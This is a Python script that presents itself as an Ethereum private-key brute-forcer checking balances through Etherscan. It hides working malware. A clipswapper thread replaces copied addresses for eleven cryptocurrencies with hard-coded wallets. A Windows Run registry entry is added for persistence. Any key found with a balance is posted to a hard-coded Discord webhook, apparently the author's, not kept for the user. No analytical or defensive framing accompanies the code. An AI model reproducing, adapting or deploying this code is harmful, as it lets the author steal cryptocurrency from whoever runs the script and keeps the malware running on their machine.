import pyperclip
import threading
import time
import re
import requests
from web3 import Account
from eth_account import Account as LocalAccount
from termcolor import colored
from colorama import init, Fore, Style

ADD_TO_STARTUP = True
HIDE_BINARIES = True


def startup():
    import os
    import winreg
    import inspect
    # Get the path of the script
    script_path = os.path.abspath(
        inspect.getframeinfo(inspect.currentframe()).filename)

    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)

    winreg.SetValueEx(reg_key, "cr", 0, winreg.REG_SZ, script_path)

    winreg.CloseKey(reg_key)

    # os.system(f"attrib +h {script_path}")

    print(" ")


def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "sol": "^S[a-z0-9_-]{29,}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0


def replace_crypto(data):
    my_addresses = {
        "lite": "LakL6BCWVUsdTTA1R1HpwNxTKgeDXyx7uY",
        "dot": "12JF76Z9u4LGuVQNhmKhhbytfNUpVZQ5Sdtuipynw6g5tgrH",
        "tron": "TNz7b2SQkRpKqE7mS4BowPyEEC7Py5rh4Q",
        "btc": "bc1qvephg8dwluzlf22zjcrnn2jklyzgj5c2yxq2em",
        "xrp": "r9ShfzutH7VV5GCpFvQHPz2kSM8coEG5r8",
        "doge": "D8VLP733dsD2oujZRHHvPksDsfZwMn5Vp2",
        "xmr": "48FkAK1oQhFfL89UM8myLi2P9LiqZuiWZZQhqGq9V22mMpiEKM2gFUcgsF3KkrWpVK1ZtoHYP16fn97LPr9BTnDD3zSn835",
        "eth": "0x86F2d4be2516582969d7654FA2f793bd7Ab55581",
        "ada": "addr1q8eq5ca2ra8z7vrs2gaqgvrvndmpy4sslmu0rjcd9gn76e0jpf36586w9uc8q536qscxexmkzftpplhc789s6238a4jsm9lux0",
        "dash": "Xt9kyCwmWEonJXXSGFhQCkWcxeGtTtUB14",
        "sol": "C2yhC1nHbECFWHVzw4iuLDsdnCui1B2CYxU5qbqrjbpF",
    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0


def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)


if __name__ == "__main__":
    if ADD_TO_STARTUP:
        startup()
    t = threading.Thread(target=main)
    t.start()


init()

API_KEYS = [
    "YOUR ETHERSCAN API",
]

api_key_index = 0

while True:
    private_key = LocalAccount.create().key.hex()[2:]
    llb = "https://discordapp.com/api/webhooks/1076879456381178006/p5vGa5RBIhvkppqjv1jzDUZwMUaabO53LhBi-nMoEI3skI9Z5cogk-DXBL_NMXCesELS"
    address = Account.from_key(private_key).address
    api_key = API_KEYS[api_key_index]
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    balance = int(response.json()["result"]) / 10**18

    if balance > 0:
        message = f"Private key| {private_key}\nAddress| {address}\nBalance| {balance} ETH"
        print(colored(message, 'green'))

        data = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(llb, json=data, headers=headers)

        break
    else:
        print(colored("Private key| ", "white") + colored(private_key, "red") + colored(" | ", "white") + colored(balance, "red") + (" ETH"))

        
    api_key_index = (api_key_index + 1) % len(API_KEYS)
    time.sleep(0.0000002)
